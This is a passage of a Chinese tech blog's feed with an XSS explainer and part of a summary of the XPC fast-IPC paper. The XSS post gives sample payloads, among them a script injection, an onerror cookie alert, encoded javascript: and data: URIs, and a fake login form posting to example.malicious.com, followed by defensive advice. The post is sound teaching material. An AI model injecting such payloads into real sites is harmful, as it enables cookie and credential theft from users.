&lt;p&gt;但最近在写 boot loader 时遇到了一些问题：我既不是在编译可执行文件，也不是在编译库，这样 CMake 就显得比较无力了，因为总是用 &lt;code&gt;add_cu</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="GNU" scheme="https://blog.sjtuxhw.top/tags/GNU/"/>
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="make" scheme="https://blog.sjtuxhw.top/tags/make/"/>
    
  </entry>
  
  <entry>
    <title>XSS 是什么？</title>
    <link href="https://blog.sjtuxhw.top/technical/xss/"/>
    <id>https://blog.sjtuxhw.top/technical/xss/</id>
    <published>2024-10-04T04:15:33.000Z</published>
    <updated>2024-10-31T04:54:40.793Z</updated>
    
    <content type="html"><![CDATA[<p>最近一个同学和我讨论一个问题，说到了 XSS 跨站攻击，我恰好对这块不是很熟，于是整理一下相关的资料，希望在编写互联网应用的时候多加注意。</p><p>同时，笔者会讨论具体的防护措施，希望大家都不会受到此类攻击的困扰。注意，下文涉及的技术细节仅供学习之用。</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Cross Site Scripting (XSS) attacks 是一类代码注入攻击。攻击者利用了互联网应用的安全漏洞将恶意代码（通常是浏览器端脚本）插入正常可信的网站，甚至篡改网页内容。由于其他终端用户的浏览器认为脚本来自可信网站，因此直接执行，最终所有 cookies/session tokens 或其他敏感信息悉数被窃取，从而达到攻击其他终端用户（其他访问者）的目的。</p><p>而让这些攻击成为可能的 “安全漏洞”，或者说缺陷，在互联网应用中广泛存在，尤其是对前端接受用户输入的部分不做检查和编码的情况下。</p><h2 id="Mechanisms"><a href="#Mechanisms" class="headerlink" title="Mechanisms"></a>Mechanisms</h2><p>XSS 的攻击方式是怎样的？通常它有以下两个步骤：</p><ol><li>数据通过不受信任的来源（最常见的是 Web 请求）进入 Web 应用程序；</li><li>可能存在恶意代码的数据包含在动态内容中发送给 Web 用户；</li></ol><p>也就是说，只要浏览器引擎可以执行的代码（一段 JavaScript，HTML，Flash 代码等等），攻击者都可以发送并让受害者执行。</p><p>XSS 攻击主要分为两类：</p><ul><li><p>Reflected XSS Attacks：顾名思义，就是指注入的脚本从 Web  服务器反射回来。</p><p>例如攻击者注入的脚本利用应用特性（例如不严谨的输入校验）嵌入在错误消息、搜索结果或任何其他响应，以链接 / 特制表单等形式传递给受害者。</p><p>当用户被诱骗点击恶意链接、提交特制表单，甚至只是浏览易受攻击的网站时，注入的代码就会传输到该网站，从而将攻击反射回用户的浏览器。然后浏览器执行代码，因为它来自“可信”服务器。Reflected XSS 有时也称为 Non-Persistent 或者 Type-I XSS（攻击通过单个请求/响应周期进行）。</p></li><li><p>Stored XSS Attacks：是指注入的脚本永久存储在目标服务器上，例如数据库、消息论坛、访问者日志、评论字段（其中评论和数据库最为常见）等。然后，受害者在请求存储的脚本时从服务器检索恶意脚本。Stored XSS 有时也称为 Persistent 或者 Type-II XSS。</p></li><li><p>（不常见）DOM-Based XSS Attacks：</p></li></ul><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>再次重申，你不应该用这些手段去作出不当的行为，这里的内容仅供学习之用。</p><p>以 Reflected XSS Attack 为例。假设一个网站后端是 PHP 书写的，有个搜索的接口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://my.project.com/a_form.html?search=stocks</span><br></pre></td></tr></table></figure><p>简化版的 PHP（危险之处是这个程序不经检查直接将有问题的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#x27;You Searched: &#x27; . $_GET[&quot;search&quot;]; ?&gt;</span><br></pre></td></tr></table></figure><p>如果攻击者不好好搜索正常的字符，而是搜索 <code>&lt;script&gt;alert(&#39;malicious code here&#39;);&lt;/script&gt;</code> 怎么办？</p><p>这样浏览器会接受到完整的 JavaScript 内联标签并执行其中的代码。</p><p>例如攻击者可以将修改后的链接传播给不知情的用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://my.project.com/a_form.html?search=&lt;script&gt;alert(&#x27;malicious code here&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果代码中的是攻击者精心设计的有害代码，那么后果不堪设想。</p><p>再以 Stored XSS Attack 为例，假设有一个技术论坛的留言系统，没有任何输入检查措施，直接储存在数据库中，并将数据渲染在页面上。</p><p>那么攻击者可以写一段伪装的登录表单作为评论：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 表单将数据发送给攻击者的网站 example.malicious.com --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;example.malicious.com&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">legend</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your name&quot;</span> <span class="attr">required</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">id</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">placeholder</span>=<span class="string">&quot;Enter your password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">required</span></span></span><br><span class="line"><span class="tag">          /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send&quot;</span> <span class="attr">class</span>=<span class="string">&quot;submit-btn&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么在评论区就会出现一个可以交互的表单。如果攻击者用 CSS 或其他手段将这个表单包装起来，引诱用户输入信息，那么后果也很严重。</p><p>如果这个评论系统一直保留这个 vulnerability，那么这种方式轻则给该网站注入牛皮癣广告，重则严重泄漏用户信息。</p><p>当然，攻击者除了明目张胆使用上面的入侵代码，还可以：</p><ul><li><p>故意写一个不存在的图片引用，让 <code>onerror</code> 执行恶意代码：<code>&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&gt;</code>；</p></li><li><p>使用 URI encoded 表示方法绕过安全检查：<code>&lt;IMG SRC=j&amp;#X41vascript:alert(&#39;test2&#39;)&gt;</code>（注：UTF-8 中 <code>a=&amp;\#X41</code> ）；</p></li><li><p>使用 base64 加密并放在 <code>META</code> tag 中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">CONTENT</span>=<span class="string">&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>……</p></li></ul><h2 id="Consequences"><a href="#Consequences" class="headerlink" title="Consequences"></a>Consequences</h2><p>无论是 stored 还是 reflected （或者是 DOM-based），XSS  攻击的后果都是相同的。它们的不同之处在于 effective payload 到达服务器的方式。</p><p>不要误以为 “只读” 的网站不易受到严重的反射型 XSS 攻击。XSS 带来的问题包括但不仅限于：</p><ul><li>帐户信息、Session Cookies 泄露、账户劫持；</li><li>泄漏用户文件、安装木马程序；</li><li>舆论上：允许攻击者修改新闻稿或新闻项目的 XSS 漏洞可能会影响公司的股价或削弱消费者的信心。</li><li>……</li></ul><h2 id="互联网应用开发者应该如何防护"><a href="#互联网应用开发者应该如何防护" class="headerlink" title="互联网应用开发者应该如何防护"></a>互联网应用开发者应该如何防护</h2><p>幸运的是，大多数现代的互联网应用程序前端框架都有防护 XSS 攻击的基本能力。</p><ul><li>React 默认情况下不允许使用 inner HTML；</li><li>React 默认情况不允许解析 <code>javascript:</code> 或 <code>data:</code> 开头的 URLs；</li><li>Angular 存在代码执行安全校验；</li><li>Polymer 默认不使用 HTML literal；</li><li>……</li></ul><p>所以开发者在前端应该：</p><ul><li>不使用 React 标注危险的 <code>dangerouslySetInnerHTML</code> 元素属性；</li><li>不使用 Angular <code>bypassSecurityTrustAs*</code> 这类函数；</li><li>尽量不使用 Polymer 的 <code>inner-h-t-m-l</code> 属性和 <code>htmlLiteral</code> 函数；</li><li>不使用过时的、被报告有缺陷的框架，及时更新；</li><li>自己不借助框架手写的话一定要注意测试此类问题，例如：<ul><li>积极使用 <code>DOMPurify</code> 来进行 HTML Sanitization，处理输入；</li><li>使用更安全的 HTML 属性，例如：<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#safe-sinks">SAFE SINKS</a>；</li></ul></li><li>等等；</li></ul><h2 id="用户应该如何防护"><a href="#用户应该如何防护" class="headerlink" title="用户应该如何防护"></a>用户应该如何防护</h2><ul><li>不点击来源不明的链接；</li><li>不访问浏览器 / 安全软件明确提示危险的不可信网页；</li><li>不在不清楚安全性的网站上填写隐私信息；</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近一个同学和我讨论一个问题，说到了 XSS 跨站攻击，我恰好对这块不是很熟，于是整理一下相关的资料，希望在编写互联网应用的时候多加注意。&lt;/p&gt;
&lt;p&gt;同时，笔者会讨论具体的防护措施，希望大家都不会受到此类攻击的困扰。注意，下文涉及的技术细节仅供学习之用。&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Web" scheme="https://blog.sjtuxhw.top/tags/Web/"/>
    
    <category term="Security" scheme="https://blog.sjtuxhw.top/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>论文阅读 - XPC: Architectural Support for Secure and Efficient Cross Process Call</title>
    <link href="https://blog.sjtuxhw.top/technical/xpc-paper/"/>
    <id>https://blog.sjtuxhw.top/technical/xpc-paper/</id>
    <published>2024-09-28T13:46:00.000Z</published>
    <updated>2024-10-31T02:26:18.113Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇 2019 年的关于微内核 IPC 性能优化的文章。</p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>微内核有很多引人注目的 features，例如 安全性、容错性、模块化，以及可定制性，这些特性近期在学术界和工业界又再次掀起了一股研究热潮（including seL4, QNX and Google’s Fuchsia OS）。</p><blockquote><p>Google’s Fuchsia’s kernel (called Zircon)</p></blockquote><p>但是 IPC（进程间通信）作为微内核的 阿喀琉斯之踵，仍然是导致微内核 OS 总体性能较低的主要因素之一。同时 IPC 在宏内核中也扮演者很重要的角色，例如 Android Linux，其中的移动端程序会经常和用户态服务通过 IPC 通信。所以优化 IPC 自然是一个很重要的课题。</p><p>之前学界对 IPC 在软件层面的优化都绕不开 Kernel，因为 IPC 在这方面的主要开销就是 域切换（domain switch）和消息复制/重映射（message copying/remapping）；在硬件层面的优化方法主要是 给内存和能力打 tag，为了隔离而替换页表。但这类修改通常需要对现有的软件栈进行相当多的修改来适应新的 OS 原语。</p><p>这篇文章主要是提出一种硬件协同的操作系统原语——也就是 XPC（Cross Process Call），提供一种高速安全的 IPC 的实现。</p><p>XPC 的主要特征是：</p><ul><li>允许在 XPC caller 和 callee 间直接切换，中途不需要陷入 Kernel；</li><li>允许消息在不同进程的调用链中传递，无需 copy；</li></ul><p>XPC 还有个优点是，这个原语本身是与传统的 “基于地址的隔离机制” 相兼容的，能比较轻松地整合到现有的微内核或者宏内核中。</p><p>所以笔者就就介绍了基于 Rocket RISC-V 核心、搭载 RPGA 的板子上实现了 XPC 的原型，并且移植到两个主流的微内核系统 seL4 和 Ziron 上、一个宏内核的 Android Binder 上以便进行评估测试、GEM5 模拟器上来验证通用性。</p><p>结果发现 XPC 能显著提升 IPC 调用的性能，Android Binder 上提升 54.2 倍，对于在微内核上跑的真实应用（sqlite/ HTTP Server）也有相当大的速度提升。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="1-问题分析"><a href="#1-问题分析" class="headerlink" title="1. 问题分析"></a>1. 问题分析</h3><ul><li><p>（微内核特征）微内核已经被详尽地研究多年了：</p><ul><li><p>最小化在特权级中执行的功能，把一些 paging、fs、设备驱动之类的组件放到用户态中，这样能实现 细粒度的隔离、更高的可扩展性、安全和容错性；</p><p>这种基于微内核的操作系统已经被广泛应用到诸如移动基站、飞行器和交通工具中；</p></li></ul></li><li><p>（微内核问题）但当前设计基于微内核的 OS 仍然面临安全和性能之间权衡的问题：</p><ul><li>更细粒度的隔离会提升系统的安全性和容错性，但是会导致 IPC 次数增多；</li></ul></li><li><p>（宏内核也面临同样的问题）对于宏内核的 OS 也存在 IPC 性能不佳的问题，针对这个问题，Android 向 Linux Kernel 中引入了 Binder 以及 Anonymous Shared Memory 来缓解这个问题，但这个开销仍然很大。</p><blockquote><p>像 Android 基于宏内核的 Linux 构建，会给移动应用程序提供一些用户态的服务，然后应用程序会频繁地调用这些服务，像是利用窗口管理器在屏幕上绘制组件，等等，开销比较大。</p></blockquote></li></ul><p>可以分析出来，IPC 的主要两个性能瓶颈在于 domain switch 以及 message copy：</p><ul><li><p>因为 caller 和 callee 分别位于用户态的两个进程，二者要发生调用的话就需要通过中断进入内核，然后切换内存地址空间，包括 Context saving/restoring、功能和权限的检查以及其他的 IPC 逻辑，一来一回的开销就不小。</p></li><li><p>此外，两个进程间因为存在虚拟内存的隔离机制，两者间传递消息就需要一些特殊手段，常见的方法是类似于 mmap 一样，分配一个共享内存，在这段共享内存中放置消息就能实现近乎 0 copy 的消息传递。</p><blockquote><p>但需要注意的是，如果 caller 和 callee 同时持有这块共享内存的话，可能会引起 <code>TOCTTOU</code>（Time Of Check To Time Of Use）攻击。</p><p><a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">TOCTTOU Details</a>；</p><p>这个问题可以通过重新映射页表的权限信息（所有权转移）来缓解，但更改页表又会涉及 Kernel 的操作，不仅无法避免用户态和内核态的切换，而且会间接造成 TLB 击穿；</p></blockquote></li></ul><p>总结下来就是，在之前众多软件解决方案中，进程切换陷入内核的开销无法避免，而且消息传递要么需要多次 copy，要么会导致 TLB 击穿；在之前的硬件解决方案中，14 年的论文提出 CODOMs（Code-centric Memory Domains）的系统架构，充分利用标记内存，而非更改页表的方式达到隔离效果，起到减少 domain switch 次数、提升消息传递效率的效果。</p><p>但这样的一个新的硬件层面的解决方案可能需要现有的使用多套内存地址的 kernel 的实现进行比较大的变动。</p><p>所以这篇文章就想提出一种新型的硬件协同的 OS 原语 XPC，实现更高效更安全的 IPC 调用，完成以下目标：</p><ul><li>（减小开销 1）让 IPC 在 caller 和 callee 间直接切换，不需要频繁陷入 kernel；</li><li>（减小开销 2）以更安全的 0 copy 的方式在 caller 和 callee 间传递数据；</li><li>（软件改动小）更轻松的集成到现有的 kernel 中，而无需很大的改动；</li><li>（硬件改动小）最小的硬件改动；</li></ul><h3 id="2-构思方案"><a href="#2-构思方案" class="headerlink" title="2. 构思方案"></a>2. 构思方案</h3><p>本文要实现的原语主要分为 3 个部分：</p><ul><li><p>创建硬件层面可感知的抽象 <code>x-entry</code>，定义新能力 <code>xcall-cap</code>：<code>x-entry</code> 中包含一个 ID，<code>xcall-cap</code> 是一个用于访问控制的新能力；</p><p>这个能力由 Kernel 管理（flexibility），并交由硬件来校验（efficiency）；</p></li><li><p>创建一组新指令，包括 <code>xcall</code>、<code>xret</code>，来让用户态的代码直接 switch 到另一个进程，而无需内核的参与；</p></li><li><p>创建一套新的内存地址空间映射机制，称为 <code>relay-seg</code>（relay memory segment，中继内存段），用来为 caller 和 callee 间做 0-copy 消息传递提供空间；</p><p>这个映射关系将存放在一个新的寄存器中，用来标识存放消息所对应的虚拟内存和物理内存的基地址以及范围；</p><ul><li><strong>这套机制能够控制共享内存的所有权转移，不仅规避了 domain switch 及其引起的 TLB 击穿带来的性能问题，而且缓解了 TOCTTOU 风险。</strong></li><li>与此同时，<code>relay-seg</code> 本身也可以通过调用链传递，称为 <code>handover</code>，也能进一步降低 copy 的次数，提升性能；</li></ul><blockquote><p>三点好处：0-copy、page-free 的所有权转移、实现 handover；</p></blockquote></li></ul><p>此外，XPC 会选用同步的 IPC 实现方式。尽管异步的 IPC 有更高的吞吐量，但同步 IPC 可以达到更低的时延，并且在 POSIX API 下更容易实现它的语义。</p><blockquote><p>即便 Google 的 Zircon 用的是异步 IPC，但它也是用异步 IPC 模拟文件系统接口的同步语义。这就造成了每次 IPC 比较大的时延。</p></blockquote><p>不仅如此，XPC 克服了传统同步 IPC 的两个限制：</p><ul><li><p>相对低下的数据传输效率（<strong>XPC 用 <code>relay-seg</code> 解决</strong>）；</p></li><li><p>对多线程应用不友好的编程模型（XPC 提供 migrating thread model 模式的编程接口，1994 Bryan Ford）；</p><blockquote><p>参见 Notes on Thread Models in Mach 3.0</p></blockquote></li></ul><p>XPC 的移植情况：</p><ul><li>Rocket RISC-V core on FPGA board（for evaluation）；</li><li>2 Micro-kernel Implementation（seL4 &amp; Zircon）；</li><li>1 Monolithic kernel Implementation（Android Binder）；</li></ul><blockquote><p>Measured: micro-benchmark &amp; real-world applications；</p></blockquote><h3 id="3-论文贡献"><a href="#3-论文贡献" class="headerlink" title="3. 论文贡献"></a>3. 论文贡献</h3><p>总的来说，这篇文章作出了如下的成果：</p><ul><li>详细分析了 IPC 的性能开销，并且对比了当今常见的几种优化方式；</li><li>提出了一种新的 OS 原语，不借助 kernel trapping，沿着调用链的 0-copy 消息传递；</li><li>Implementation……</li><li>An evaluation on micro-benchmark &amp; real-world platform；</li></ul><h2 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h2><ul><li><p>IPC 的性能仍然很重要：</p><ul><li>使用前沿 microkernel（seL4）分析性能，在运行 sqlite3 的 seL4 的 RISC-V 板子上测试 YCSB benchmark，发现在这个 workload 下有 18%-39% 的时间都在 IPC；</li><li>在消息量很短的情况下，性能瓶颈位于 domain switch；随着 IPC 消息量增大，性能瓶颈趋向于 message transfer；</li></ul><p>这个性能测试激励笔者设计 XPC 时兼顾快速的 domain switch 和高效的消息传递两个因素；</p></li><li><p>拆开 IPC，详细分析其中各个步骤的性能瓶颈，同样使用 mirco-kernel seL4 &amp; RISC-V board with FPGA；</p><ul><li><p>fast path（聚焦）：自然是不存在其他中断和调度的情况，只有 trap（syscall）、IPC 逻辑、Process Switch、Restore、Message Transfer；</p><ul><li><p><strong>Trap &amp; Restore</strong>:</p><ul><li>过程：syscall -&gt; context switch -&gt; […] -&gt; restore callee’s context -&gt; callee user space（domain switch 的两大重要开销）；</li></ul><blockquote><p>一般情况下，这个 domain switch 的开销不可避免（caller &amp; callee 互不信任）；</p><p><strong><u>设想</u></strong>：但是某些情况下 caller 和 callee 可以自定义 calling conventions，让它们自己管理 context 就能在 isolation 和 performance 间找到最佳平衡；</p></blockquote></li><li><p>IPC Logic: <strong><u>CHECKING</u></strong>！</p><blockquote><p>seL4 使用 capabilities 管理 kernel 资源，包括 IPC：</p><p>kernel 找到 caller 的 capability &amp; 检查有效性</p><p>-&gt; 然后检查以下条件，来确定是否发生调度：</p><ul><li>caller / callee 有不同优先级？</li><li>caller / callee 不在一个核上？</li><li>message 大小大于寄存器（32 bytes）但小于 IPC buffer size（120 bytes）；</li></ul><p>以上满足一项，就调度到其他进程（slow path）</p></blockquote><p><strong><u>设想</u></strong>：这些检测步骤可以由硬件完成，通过并行化来缓解时延问题。此外，这步启发我们将这个 checking 逻辑分为 control plane（软件 -&gt; flexibility）和 data plane（硬件 -&gt; efficiency），<strong>回想 <code>xcall-cap</code> 能力</strong>；</p></li><li><p>Process Switch:</p><ul><li>4 步过程：dequeue callee &amp; block caller -&gt; add <code>reply_cap</code> into callee thread -&gt; kernel 传送小于一个寄存器大小的消息 -&gt; switch to callee’s user space address；</li><li>存在内存访问，cache miss / TLB miss 会影响本部分性能；</li></ul></li><li><p>Message Transfer：</p><ul><li>一个寄存器大小以内的，上面 process switch 时传递（short path）；</li><li>大于一个寄存器大小、小于 IPC buffer size 的，进入 slow path（interrupt &amp; schedule）来传输数据；</li><li>大于 IPC buffer size 的，seL4 会使用位于用户态的 shared memory 来减少 copy；</li></ul><p>但是最后一种情况使用 shared memory 确实不安全：多线程的 caller 可以观察 callee 的操作，并且能通过修改共享内存信息，从而影响 callee 行为；并且在大部分实现中，数据还是要先 copy 到共享内存中去。所以大数据量下 message transfer 仍然是开销大头；</p></li></ul></li><li><p>slow path：会考虑到现实情况下，可能存在 OS 的其他中断以及进程调度；</p></li></ul></li></ul><p>基于上述分析，观察到两点：</p><ol><li>一个快速的 IPC 需要不经过 Kernel 的参与，但现在还没实现；</li><li>在传输消息时，安全、快速的 0-copy 机制对于 IPC 性能是很重要的，尤其是大数据量的情况；</li></ol><p>根据这两点，笔者设计了 XPC 的总体框架：</p><h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><h3 id="总体概览"><a href="#总体概览" class="headerlink" title="总体概览"></a>总体概览</h3><p><img src="imgs/xpc-engine.png" /></p><p>XPC Engine 提供 <code>x-entry</code> &amp; <code>xcall-cap</code> 两个抽象。规则如下：</p><ul><li>一个进程可以创建多个 <code>x-entries</code>；所有的 entries 都会存放在 <code>x-entry-table</code> 中，并且每个 entry 有一个 ID（就是 table index）；</li><li>table 本身存放在全局的 memory 中，有一个寄存器 <code>x-entry-table-reg</code> 存放表基地址，<code>x-entry-table-size</code> 控制表长；</li><li>一个 caller 需要 <code>xcall-cap</code> 这个能力来 invoke 一个 <code>x-entry</code>。<code>xcall-cap</code> 描述了对每个 <code>x-entry</code> 能否 invoke 的能力；</li><li><code>xcall #reg</code> 和 <code>xret</code> 控制进行 XPC 调用的两条指令，<code>#reg</code> 是 kernel 提供的具体 <code>x-entry</code> 的 index，对应 Kernel 管理的 <code>xcall-cap-reg</code> 内的能力（里面可以 check）；</li></ul><p>XPC 进行轻量的信息 copy 的 <code>relay-seg</code> 规则如下：</p><ul><li>relay memory segment 位于一段连续的物理内存上，不由页表管理，只有 <code>seg-reg</code> 寄存器承担 VM 翻译工作（里面存放虚拟内存和物理内存基地址，以及区域长度和权限信息，相当于全能版 PTE）；</li><li>OS Kernel 会确保这片区域不会和分配的普通页表 overlap；</li></ul><blockquote><p>这样修改区域权限的时候就能绕开页表，避免 TLB 击穿；</p></blockquote><h3 id="XPC-Engine"><a href="#XPC-Engine" class="headerlink" title="XPC Engine"></a>XPC Engine</h3><p>执行 <code>xcall #reg</code> 时，XPC Engine 完成以下任务：</p><ol><li><p>读取 <code>#reg</code> index，按 <code>xcall-cap-reg</code>（可以是 general purpose register）指向的存放 bitmap 的内存区域校验 caller 的能力（细节见下文）；</p></li><li><p>从 <code>x-entry-table</code> 读取对应的 <code>x-entry</code>，检查这个 entry 是否有效；</p></li><li><p>向 link stack 表（kernel space）中推入一条记录，保存返回时的必要信息。其中 link stack 在每个线程中都有；</p><blockquote><p>类似普通 <code>call / ret</code> 指令需要操作 <code>%rsp</code> 来在栈上保存 return address、类似 system call 会用 <code>%rcx / %r11</code> 保存 <code>rflags</code> 和 $I_{next}$，这里新的 <code>xcall / xret</code> 就需要一个返回时必要信息，这里称 linkage record；</p></blockquote></li><li><p>CPU 切换 Page Table（CR3），flush TLB，设置 PC 为 callee 进程的 procedure 入口地址。最后还会把 caller 的 <code>xcall-cap-reg</code> 放到寄存器中（RISC-V 中用的是 <code>t0</code>），让 callee 知道关于 caller 的信息；</p><blockquote><p>这相当于 “精简版” 的 context switch。但这样会有问题吗？细节见下文；</p></blockquote></li></ol><p>虽然没有真正涉及到 kernel（domain switch），但如果出现 exception 还是会 report 给 kernel 来决定；</p><p>执行 <code>xret</code> 时，XPC Engine 通过弹出 link stack 中的一条记录，检验 valid 并完成一次简单的 switch 来回到 caller 所在进程；</p><p>那么 <code>xcall-cap</code> 是如何管理、<code>xcall #reg</code> 指令是如何校验 caller 的能力的呢？原来：</p><ul><li>每个线程就有一块内存空间，起始地址存放在 <code>xcall-cap-reg</code> 中，也是由 Kernel 管理；这块内存空间就是一片 bitmap，第 i bit 是 1 就表示该线程有能力 invoke ID 为 i（也就是在 <code>xcall-table</code> 中 index=i）的 <code>x-entry</code>；</li></ul><p>就和之前说的一样，这里由 Kernel 管理，由硬件校验；</p><p>还有一点是 link stack，虽然说 <code>xcall</code> 完成了一次简单的 context switch，但毕竟只改了 Page Table、TLB、PC，还有进程很多其他信息像文件描述符表、CPU 寄存器等信息没有恢复，也没保存在 link stack 中。</p><blockquote><p>有些 per-thread 的 寄存器（例如 <code>xcall-cap-reg</code>）会在 <code>xcall</code> 的时候交给硬件修改；</p></blockquote><p>这是因为 XPC engine 想把这部分恢复工作交给 XPC 库/应用来放到 user space 来做。对不同架构，如果有些信息在 user space 恢复不了，还可以扩展这个表，让它满足其他架构的 switch 需求。这就是前面提到的 caller 调用 callee 中 “共同约定管理 context 能优化掉 Kernel 参与 switch 的过程”。</p><p>这里还有一个严重的问题。在 <code>xcall</code> 从 caller 向 callee 切换的时候，可能在期间发生一次 page fault 中断进入 Kernel，因为 Kernel 对这个过程无感知，所以可能会用 caller 的 page table / VMA 等信息来处理 callee 的 page fault。解决方案借鉴了 migrating thread，将由 kernel 管理的线程状态划分为两类：</p><ul><li>scheduling states：关于内核调度的信息，包括 kernel stack、优先级、time slice；</li><li>runtime states：内核用来服务这个线程的信息，例如地址空间（VM 分配）、capabilities 等等；</li></ul><p>这里可以让 <code>xcall-cap-reg</code> 作为一个 runtime states 让 kernel 区分；当 trap 到 kernel 时，让 kernel 通过 <code>xcall-cap-reg</code> 找到当前线程的 runtime-states，从而解决问题；</p><p>笔者还提到 <code>xcall</code> 向 link stack（每个线程中，位于主存）写数据时有时延，可以采用非阻塞式地异步写，可以优化 16 cycles；</p><p>笔者表示，除了写 link stack 会有较高的延迟，需要优化以外，第二步从 <code>x-entry-table</code> 中取 entry 也耗时所以单独给这个表做缓存。不过基于两个事实：</p><ul><li>IPC 的时间局部性很强；</li><li>IPC 是可预测的；</li></ul><p>笔者提出使用软件层面的 cache，预测要进行的 IPC 并把需要的 entry 先 prefetch 一下，又能提升 12 cycles；</p><h3 id="关于-Relay-Memory-Segment"><a href="#关于-Relay-Memory-Segment" class="headerlink" title="关于 Relay Memory Segment"></a>关于 Relay Memory Segment</h3><p><img src="imgs/seg-mask.png" /></p><ul><li><p><code>seg-reg</code> 的地位：我们知道，relay memory segment 已经脱离 page table 的管理，相当于用 <code>seg-reg</code> 做了一个独立、持久的 TLB；不过在地址翻译过程中，<code>seg-reg</code> 的优先级高于 TLB；</p></li><li><p><code>seg-mask</code> 寄存器规定的新功能：目前 <code>seg-reg</code> 指定了 relay memory segment 的全部范围，但实际上在某些场景下，我们只希望传递其中一片区域的信息，但 user space 的 app 是不能改 <code>seg-reg</code> 寄存器的，所以可以使用 <code>seg-mask</code> 来规定范围：</p><p>这样在 <code>xcall</code> 填入 link stack 时，把原来的 <code>seg-reg</code> 和 <code>seg-mask</code> 信息保存下，再把 <code>seg-reg</code> 和  <code>seg-mask</code> 的交集更新到 <code>seg-reg</code> 中。这样后面的 calling chain 就只能看到这片内存；</p></li><li><p><code>seg-list</code> 支持服务端创建多个 relay memory segment 区域：每个进程管理一个 <code>seg-list</code>，其基地址使用 <code>seg-list-reg</code> 存放（<code>seg-list</code> 和 <code>seg-list-reg</code> 都由 OS Kernel 管理）；执行 <code>swapseg #reg</code> 即可切换到 <code>#reg</code> 索引的 entry 中（atomic），更新新的 